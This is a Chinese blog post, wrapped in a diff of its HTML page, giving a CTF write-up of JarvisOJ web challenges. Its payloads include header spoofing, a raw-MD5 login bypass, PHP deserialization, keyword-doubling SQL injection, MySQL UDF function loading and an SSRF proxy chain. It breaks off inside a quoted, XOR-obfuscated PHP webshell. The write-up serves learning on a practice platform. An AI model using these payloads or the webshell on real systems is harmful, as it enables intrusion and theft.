@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/favicon.png?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF_Web," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="写在最前前天做了MOCTF，有些遗憾，本来能做出来的题却没能做出来(嚎啕大哭)，这次的失误也是因为以前自己做过的题并没有好好总结复习导致的，所以决定重新把之前做过的CTF题翻出来重新做一遍，重新学习吧！由于难度问题，JarvisOJ上的题我还没有完全全部做完，这里先贴出我已经做出来的题目。JarvisOJ：https://www.jarvisoj.com PORT 51根据提示，这里要使用vps上">
+<meta name="keywords" content="CTF_Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JarvisOJ Writeup">
+<meta property="og:url" content="http://yoursite.com/2018/02/15/JarvisOJ/index.html">
+<meta property="og:site_name" content="Willard&#39;s Blog">
+<meta property="og:description" content="写在最前前天做了MOCTF，有些遗憾，本来能做出来的题却没能做出来(嚎啕大哭)，这次的失误也是因为以前自己做过的题并没有好好总结复习导致的，所以决定重新把之前做过的CTF题翻出来重新做一遍，重新学习吧！由于难度问题，JarvisOJ上的题我还没有完全全部做完，这里先贴出我已经做出来的题目。JarvisOJ：https://www.jarvisoj.com PORT 51根据提示，这里要使用vps上">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a84609d14c70.png">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a8461074978b.png">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a84612d80abb.png">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a846127d448a.png">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a84691f569a0.png">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a84692816912.png">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a84692b81901.png">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a84692838dc0.png">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a8474719be1a.png">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a8474703bae9.png">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a84747039ef2.png">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a84747017595.png">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a8484a62f306.png">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a8484a630f88.png">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a8549de601f0.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a8494f9b4e87.png">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a85394be2c3e.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a85395057c9c.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a853954bc174.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a853954bc16d.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a855ed6e73f6.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/02/16/5a85c50f65847.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/02/16/5a86810f648d8.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/02/16/5a86810f695ab.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/02/16/5a86810f76d85.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/02/16/5a868e916d1ca.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/02/16/5a868e91a3a25.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/02/16/5a868e91bd7df.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/02/16/5a868e91dc52e.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/02/16/5a868e91efb5e.jpg">
+<meta property="og:updated_time" content="2018-02-16T15:16:45.756Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="JarvisOJ Writeup">
+<meta name="twitter:description" content="写在最前前天做了MOCTF，有些遗憾，本来能做出来的题却没能做出来(嚎啕大哭)，这次的失误也是因为以前自己做过的题并没有好好总结复习导致的，所以决定重新把之前做过的CTF题翻出来重新做一遍，重新学习吧！由于难度问题，JarvisOJ上的题我还没有完全全部做完，这里先贴出我已经做出来的题目。JarvisOJ：https://www.jarvisoj.com PORT 51根据提示，这里要使用vps上">
+<meta name="twitter:image" content="https://i.loli.net/2018/02/15/5a84609d14c70.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/02/15/JarvisOJ/"/>
+
+
+
+
+
+  <title>JarvisOJ Writeup | Willard's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Willard's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">我永远喜欢德国队！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/15/JarvisOJ/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Willard">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2018/02/19/5a8ad395132b9.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Willard's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">JarvisOJ Writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-15T23:11:51+08:00">
+                2018-02-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="写在最前"><a href="#写在最前" class="headerlink" title="写在最前"></a>写在最前</h3><p>前天做了MOCTF，有些遗憾，本来能做出来的题却没能做出来(嚎啕大哭)，这次的失误也是因为以前自己做过的题并没有好好总结复习导致的，所以决定重新把之前做过的CTF题翻出来重新做一遍，重新学习吧！<br>由于难度问题，JarvisOJ上的题我还没有完全全部做完，这里先贴出我已经做出来的题目。<br>JarvisOJ：<a href="https://www.jarvisoj.com" target="_blank" rel="noopener">https://www.jarvisoj.com</a></p>
+<h3 id="PORT-51"><a href="#PORT-51" class="headerlink" title="PORT 51"></a>PORT 51</h3><p><img src="https://i.loli.net/2018/02/15/5a84609d14c70.png" alt=""><br>根据提示，这里要使用vps上的51端口去访问，所以使用curl命令去访问即可获取flag。<br><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl --<span class="keyword">local</span>-port <span class="number">51</span> http:<span class="comment">//web.jarvisoj.com:32770/</span></span><br></pre></td></tr></table></figure></p>
+<p>flag:PCTF{M45t3r_oF_CuRl}</p>
+<h3 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h3><p><img src="https://i.loli.net/2018/02/15/5a8461074978b.png" alt=""><br>只能由localhost访问，XFF无疑，构造X-Forwarded-For:127.0.0.1即可获取flag。<br>flag:PCTF{X_F0rw4rd_F0R_is_not_s3cuRe}</p>
+<h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>打开页面后是一个密码提示框，随意输入数字（比如:123）以后抓包在Repeater中查看，可以看到一条Hint信息。<br><img src="https://i.loli.net/2018/02/15/5a84612d80abb.png" alt=""><br>这里是需要进行单引号绕过，而md5($pass,true)是将md5值转换为16进制数，如果包含or，就能重置构造语句。<br><img src="https://i.loli.net/2018/02/15/5a846127d448a.png" alt=""><br>参考链接：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/qq_31481187/</span>article<span class="regexp">/details/</span><span class="number">59727015</span></span><br></pre></td></tr></table></figure></p>
+<p>所以直接提交ffifdyop就能获取flag。<br>flag:PCTF{R4w_md5_is_d4ng3rous}</p>
+<h3 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h3><p>作为一个漫威老铁，第一次打开界面的时候惊艳到了我，神盾大法好！<br>OK，进入正题，右键源码以后发现了这个：<br><img src="https://i.loli.net/2018/02/15/5a84691f569a0.png" alt=""><br>c2hpZWxkLmpwZw==经过base64解码以后为shield.jpg，如法炮制，猜测了一下flag.php，不过没有，测试index.php，右键以后发现源码。<br><img src="https://i.loli.net/2018/02/15/5a84692816912.png" alt=""><br>里面require到了shield.php这个文件，这里有反序列化，但是不知道构造规则，而且最后调用了readfile()这个函数，所以猜测还存在shield.php的源码，再次base64以后提交查看是否有源代码。<br><img src="https://i.loli.net/2018/02/15/5a84692b81901.png" alt=""><br>果然这里还是有源代码的，并且readfile()这个函数就出自这个文件，读了一下代码发现构造的文件不为空且不能含有..和/以及\，成功读取以后就能返回需要的文件。<br>所以利用的还是PHP反序列化漏洞，根据代码提示，flag在pctf.php这个文件中，所以这里要读取的就是这个文件。<br>构造脚本写出反序列化代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span></span></span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">public</span> $file=<span class="string">"pctf.php"</span>;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	$will=<span class="keyword">new</span> shield();</span></span><br><span class="line"><span class="php">	print_r(serialize($will));</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:6</span><span class="selector-pseudo">:"Shield"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"file"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>因为是在index.php里面包含的shield.php，所以是在这里调用class参数构造反序列化。<br>最后访问:<br><figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:<span class="number">32768</span>/index.php?class=O:<span class="number">6</span>:<span class="string">"Shield"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>得到flag。<br><img src="https://i.loli.net/2018/02/15/5a84692838dc0.png" alt=""></p>
+<h3 id="IN-A-mess"><a href="#IN-A-mess" class="headerlink" title="IN A mess"></a>IN A mess</h3><p>OK，右键源码index.phps找到代码，开始审计。<br><img src="https://i.loli.net/2018/02/15/5a8474719be1a.png" alt=""><br>id==0弱类型设置为a(或者其他字母)，a这里file_get_contents($a,’r’);这个函数果断php://input，b的话长度大于5并且要绕过ereg和substr，所以直接%00截断。<br><img src="https://i.loli.net/2018/02/15/5a8474703bae9.png" alt=""><br>获取字段：^HT2mCpcvOLf<br><img src="https://i.loli.net/2018/02/15/5a84747039ef2.png" alt=""><br>测试以后发现sql注入，并且爆出表名content。<br><img src="https://i.loli.net/2018/02/15/5a84747017595.png" alt=""><br>开始绕sql注入，首先发现过滤了空格<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32780</span><span class="regexp">/^HT2mCpcvOLf/i</span>ndex.php?id=-<span class="number">1</span><span class="regexp">/*123*/u</span>nunionion<span class="regexp">/*123*/</span>selselectect<span class="regexp">/*123*/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>回显出列数为3。<br>测试过程中发现其还过滤了from，但没有过滤where。<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32780</span><span class="regexp">/^HT2mCpcvOLf/i</span>ndex.php?id=-<span class="number">1</span><span class="regexp">/*123*/u</span>nunionion<span class="regexp">/*123*/</span>selselectect<span class="regexp">/*123*/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(table_name)<span class="regexp">/*123*/</span>frfromom<span class="regexp">/*123*/i</span>nformation_schema.tables<span class="regexp">/*123*/</span>where<span class="regexp">/*123*/</span>table_schema=<span class="number">0</span>x74657374%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>表名只有content，和之前报错出来的一样，下面注列。<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32780</span><span class="regexp">/^HT2mCpcvOLf/i</span>ndex.php?id=-<span class="number">1</span><span class="regexp">/*123*/u</span>nunionion<span class="regexp">/*123*/</span>selselectect<span class="regexp">/*123*/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(column_name)<span class="regexp">/*123*/</span>frfromom<span class="regexp">/*123*/i</span>nformation_schema.columns<span class="regexp">/*123*/</span>where<span class="regexp">/*123*/</span>table_name=<span class="number">0</span>x636F6E74656E74%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>注出列有：id,context,title。<br>修改注入语句拿flag。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:<span class="number">32780</span>/^HT2mCpcvOLf/index.php?id=-<span class="number">1</span><span class="comment">/*123*/</span>ununionion<span class="comment">/*123*/</span>selselectect<span class="comment">/*123*/</span><span class="number">1</span>,<span class="number">2</span>,<span class="built_in">concat</span>(id,<span class="built_in">context</span>,<span class="built_in">title</span>)<span class="comment">/*123*/</span>frfromom<span class="comment">/*123*/</span>content%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>flag:PCTF{Fin4lly_U_got_i7_C0ngRatulation5}</p>
+<h3 id="RE"><a href="#RE" class="headerlink" title="RE?"></a>RE?</h3><p>点进去以后直接就是一个文件下载，下载出来的文件为<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">udf</span><span class="selector-class">.so</span><span class="selector-class">.02f8981200697e5eeb661e64797fc172</span> 。</span><br></pre></td></tr></table></figure></p>
+<p>udf?<br>UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。<br>这里参考到了一篇文章，关于Mysql的udf提权： <a href="https://www.404sec.com/7815.html" target="_blank" rel="noopener">https://www.404sec.com/7815.html</a><br>简单来说，udf是为了拓展功能而可以自行添加函数，不过添加的函数为恶意函数就能导致代码执行，OK，返回题目，题目给出的提示是“不过里面有个help_me函数挺有意思的哦”，那就是说这里需要创建自定义函数了。<br>创建自定义函数的语法：create function 函数名 returns string soname ‘导出的DLL路径’；<br>现在，把这个文件通过命令<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">https:</span><span class="comment">//dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</span></span><br></pre></td></tr></table></figure></p>
+<p>直接导入位于Ubuntu（我的版本是14.04）下的mysql目录：/usr/lib/mysql/plugin中，然后启动mysql。<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mysql -u root -p</span></span><br></pre></td></tr></table></figure></p>
+<p>如果没有配置相关环境，可以参考我的这篇博客：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://willardtm.github.io/<span class="number">2018</span>/<span class="number">02</span>/<span class="number">10</span>/Ubuntu<span class="symbol">%E6</span><span class="symbol">%90</span><span class="symbol">%AD</span><span class="symbol">%E5</span><span class="symbol">%BB</span><span class="symbol">%BA</span><span class="symbol">%E6</span><span class="symbol">%BC</span><span class="symbol">%8</span>F<span class="symbol">%E6</span><span class="symbol">%B4</span><span class="symbol">%9</span>E<span class="symbol">%E7</span><span class="symbol">%8</span>E<span class="symbol">%AF</span><span class="symbol">%E5</span><span class="symbol">%A2</span><span class="symbol">%83</span>/</span><br></pre></td></tr></table></figure></p>
+<p>创建自定义函数。<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">create</span> <span class="function"><span class="keyword">function</span> <span class="title">help_me</span> <span class="title">returns</span> <span class="title">string</span> <span class="title">soname</span> <span class="string">'udf.so.02f8981200697e5eeb661e64797fc172'</span>;</span></span><br></pre></td></tr></table></figure></p>
+<p>访问自定义函数。<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">help_me</span>(<span class="params"></span>)</span>;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/02/15/5a8484a62f306.png" alt=""><br>get到提示以后再次创建自定义函数。<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">create</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span> <span class="title">returns</span> <span class="title">string</span> <span class="title">soname</span> <span class="string">'udf.so.02f8981200697e5eeb661e64797fc172'</span>;</span></span><br></pre></td></tr></table></figure></p>
+<p>访问自定义函数。<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">getflag</span>(<span class="params"></span>)</span>;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/02/15/5a8484a630f88.png" alt=""><br>成功获取flag:PCTF{Interesting_U5er_d3fined_Function}</p>
+<h3 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h3><p>抓包以后发现role和hsh这两个参数很可疑，role是经过了两次URL加密后的guest，但是hsh不能被md5解密，所以我修改为s:5:”admin”;按照其两次URL加密的方式提交，只有一行报错信息，但似乎没有什么用？<br>于是我猜想可能会有源码泄露，果然，源码泄露在index.php~下面，OK，获取源码，但是查看完源码以后发现源码是坏的，vim -r只能恢复swap文件，所以重命名index.php~为index.php.swp，再vim -r index.php.swp即可恢复。<br><img src="https://i.loli.net/2018/02/15/5a8549de601f0.jpg" alt=""><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">       $auth = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">       $role = <span class="string">"guest"</span>;</span></span><br><span class="line"><span class="php">       $salt = </span></span><br><span class="line"><span class="php">       <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span></span><br><span class="line"><span class="php">           $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span></span><br><span class="line"><span class="php">           $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span></span><br><span class="line"><span class="php">           <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;</span></span><br><span class="line"><span class="php">               $auth = <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">           &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">               $auth = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">           &#125;</span></span><br><span class="line"><span class="php">       &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">           $s = serialize($role);</span></span><br><span class="line"><span class="php">           setcookie(<span class="string">'role'</span>,$s);</span></span><br><span class="line"><span class="php">           $hsh = md5($salt.strrev($s));</span></span><br><span class="line"><span class="php">           setcookie(<span class="string">'hsh'</span>,$hsh);</span></span><br><span class="line"><span class="php">       &#125;</span></span><br><span class="line"><span class="php">       <span class="keyword">if</span> ($auth) &#123;</span></span><br><span class="line"><span class="php">           <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is </span></span></span><br><span class="line"><span class="php">       &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">           <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;</span></span><br><span class="line"><span class="php">       &#125;</span></span><br><span class="line"><span class="php">   <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>现在是一波代码审计，从role===”admin”这里看来，我之前的猜测不错，并且hsh值要等于加盐的admin值最后才能拿到flag，这里又是hash拓展长度攻击了…这个之前就一直没搞懂，这里先放一下，立一个严肃的flag，三月底前学会这个hash拓展长度攻击。</p>
+<h3 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h3><p>这个题有一丢丢的脑洞在里面，既然是一句话木马，我就联想到文件上传里面包含的一句话，所以就把首页上那个菜刀图给下载了下来，然后Notepad++打开去搜php，2333但是关注点确实不在这里。<br>右键查看源码，这张图片的链接很奇怪，如下图：<br><img src="https://i.loli.net/2018/02/15/5a8494f9b4e87.png" alt=""><br>然后点击管理员登录后/admin显示Forbidden，但是右键源码以后可以看到一组管理员ip(103.27.76.153)提示,虽然这题的Cookie值里也有role这一条，不过没什么用。<br>所以重新构造URL：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=http:/</span><span class="regexp">/103.27.76.153/</span>proxy.php?url=http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/admin</span></span><br></pre></td></tr></table></figure></p>
+<p>网站进行扫描以后发现admin目录下有robot.txt这个文件，点开以后里面是：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-<span class="string">agent:</span> *</span><br><span class="line"><span class="string">Disallow:</span>trojan.php</span><br><span class="line"><span class="string">Disallow:</span>trojan.php.txt</span><br></pre></td></tr></table></figure></p>
+<p>把trojan.php保存下来运行</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> $&#123;(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"#"</span>^<span class="string">"|"</span>)&#125;=(<span class="string">"!"</span>^<span class="string">"`"</span>).(<span class="string">"( "</span>^<span class="string">"&#123;"</span>).(<span class="string">"("</span>^<span class="string">"["</span>).(<span class="string">"~"</span>^<span class="string">";"</span>).(<span class="string">"|"</span>^<span class="string">"."</span>).(<span class="string">"*"</span>^<span class="string">"~"</span>);$&#123;(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"#"</span>^<span class="string">"|"</span>)&#125;((<span class="string">"-"</span>^<span class="string">"H"</span>). (<span class="string">"]"</span>^<span class="string">"+"</span>). (<span class="string">"["</span>^<span class="string">":"</span>). (<span class="string">","</span>^<span class="string">"@"</span>). (<span class="string">"&#125;"</span>^<span class="string">"U"</span>). (<span class="string">"e"</span>^<span class="string">"A"</span>). (<span class="string">"("</span>^<span class="string">"w"</span>).(<span class="string">"j"</span>^<span class="string">":"</span>). (<span class="string">"i"</span>^<span class="string">"&amp;"</span>). (<span 